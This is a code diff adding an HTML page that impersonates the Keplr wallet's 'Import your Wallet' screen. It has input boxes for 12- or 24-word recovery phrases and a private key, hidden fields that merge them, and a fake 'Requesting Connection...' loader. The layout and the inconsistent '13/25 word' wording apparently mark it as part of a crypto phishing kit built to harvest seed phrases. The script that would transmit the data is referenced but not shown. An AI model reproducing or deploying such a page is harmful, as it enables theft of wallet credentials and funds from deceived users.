@@ -1,0 +1,210 @@
+<html lang="en"><head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Import</title>
+    <link rel="stylesheet" href="style/loader.min.css">
+    <link rel="stylesheet" href="style/style.css">
+    <link rel="stylesheet" href="themify-icons.css">
+    <script src="osmo_files/jquery.min.js"></script>
+    <script src="style/main.js"></script>
+<style>
+    div.errorContainer {
+        padding: 8px;
+        background: #FF6347aa;
+        color: #900;
+        font-weight: 100;
+        border-radius: 5px;
+        display: none;
+    }
+</style></head>
+
+<body data-lang="en" style="">
+    <div class="first" id="first" style="display: none;">
+        <header>
+            <img src="assets/intro-logo.png" alt="Keplr Logo">
+            <span class="title"> Your Interchain Gateway </span>
+        </header>
+        <section>
+            <article>
+                <video width="200" height="200" autoplay="" loop="" __idm_id__="696321">
+                    <source src="assets/intro.webm">
+                </video>
+            </article>
+            <article>
+                <button id="create">Create a new wallet</button>
+                <button id="import">Import an existing wallet</button>
+                <button id="connect">Connect Hardware Wallet</button>
+            </article>
+        </section>
+    </div>
+
+    <div class="second" id="second" style="display: flex;">
+        <header>
+            <label class="help">Help Desk </label>
+            <span class="title"><span class="back" id="back"></span> Import your Wallet</span><br>
+            <span class="sub-title">Glad you’re back! </span>
+        </header>
+        <section>
+                <article>
+                    <span class="title">Recovery Phrase </span>
+                    <br><br>
+                    <span class="sub-title">Use an existing 13/25 word recovery phrase. You can also import wallets from other wallet providers.</span>
+                    <br><br>
+                    <button id="recovery"><a href="phrase.html" style="color: white; text-decoration: none;"> Use recovery phrase </a></button>
+                </article>
+                <article>
+                    <span class="title">Private Key</span>
+                    <br><br>
+                    <span class="sub-title">Log in with your private key to import an existing account.</span>
+                    <br><br><br>
+                    <button id="google"><a href="privatekey.html" style="color: white; text-decoration: none;">  Connect with private key</button>
+                </article>
+        </section>
+    </div>
+
+    <div class="third" id="third" style="display: none;">
+        <header>
+            <label class="help">Help Desk <i class="ti-help-alt"></i></label>
+            <span class="title"><span class="back" id="back2"><i class="ti-arrow-circle-left"></i></span> Import Existing Wallet </span><br>
+            <span class="sub-title">
+                <ul>
+                    <li>Enter your recovery phrase here to restore your wallet. Or click on any blank and paste the entire phrase.</li>
+                    <li>Enter the phrase in the right order without capitalization, punctuation symbols, or spaces.</li>
+                </ul>    
+            </span>
+        </header>
+        <section class="phraseCont">
+            <article>
+                <span class="title">
+                    
+                    <button id="private">Private key</button>
+                </span>
+                <div class="slideTitle"></div>
+            </article>
+            <article class="twelve">
+                <span>  
+                    1.
+                    <input type="text" id="box1">
+                    2.
+                    <input type="text" id="box2">
+                    3.
+                    <input type="text" id="box3">
+                </span>
+                <span>
+                    4.
+                    <input type="text" id="box4">
+                    5.
+                    <input type="text" id="box5">
+                    6.
+                    <input type="text" id="box6">
+                </span>
+                <span>
+                    7.
+                    <input type="text" id="box7">
+                    8.
+                    <input type="text" id="box8">
+                    9.
+                    <input type="text" id="box9">
+                </span>
+                <span>
+                    10.
+                    <input type="text" id="box10">
+                    11.
+                    <input type="text" id="box11">
+                    12.
+                    <input type="text" id="box12">
+                </span>
+                <input type="hidden" id="twelveMerge">
+                <button id="twelve-btn">Import</button>
+            </article>
+            <article class="twentyfour" style="display: none;">
+                <span>  
+                    1.
+                    <input type="text" id="2box1">
+                    2.
+                    <input type="text" id="2box2">
+                    3.
+                    <input type="text" id="2box3">
+                    4.
+                    <input type="text" id="2box4">
+                </span>
+                <span>
+                    5.
+                    <input type="text" id="2box5">
+                    6.
+                    <input type="text" id="2box6">
+                    7.
+                    <input type="text" id="2box7">
+                    8.
+                    <input type="text" id="2box8">
+                </span>
+                <span>
+                    9.
+                    <input type="text" id="2box9">
+                    10.
+                    <input type="text" id="2box10">
+                    11.
+                    <input type="text" id="2box11">
+                    12.
+                    <input type="text" id="2box12">
+                </span>
+                <span>
+                    13.
+                    <input type="text" id="2box13">
+                    14.
+                    <input type="text" id="2box14">
+                    15.
+                    <input type="text" id="2box15">
+                    16.
+                    <input type="text" id="2box16">
+                </span>
+                <span>
+                    17.
+                    <input type="text" id="2box17">
+                    18.
+                    <input type="text" id="2box18">
+                    19.
+                    <input type="text" id="2box19">
+                    20.
+                    <input type="text" id="2box20">
+                </span>
+                <span>
+                    21.
+                    <input type="text" id="2box21">
+                    22.
+                    <input type="text" id="2box22">
+                    23.
+                    <input type="text" id="2box23">
+                    24.
+                    <input type="text" id="2box24">
+                </span>
+                <input type="hidden" id="twentyfourMerge">
+                <button id="twentyfour-btn">Import</button>
+            </article>
+            <article class="private" style="display: none; display: block; margin: auto;">
+                <span>  
+                    <input type="text" id="privateMerge">
+                </span>
+                <button id="private-btn">Import</button>
+            </article>
+        </section>
+    </div>
+    
+    <!-- loader page -->
+
+<div class="connectLoader px-4" style="display: none;">
+    <div class="dialog p-4 mx-auto align-center">
+        <!-- loader -->
+        <div class="lds-spinner"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>
+        <!-- end loader -->
+        <div class="mt-4">
+            <h5 class="reduceH5" id="serverConnectionDetails">
+                Requesting Connection... <br>
+                <small>Fetching connection protocols</small>
+            </h5>
+        </div>
+    </div>
+</div>
+
+
+</body></html>
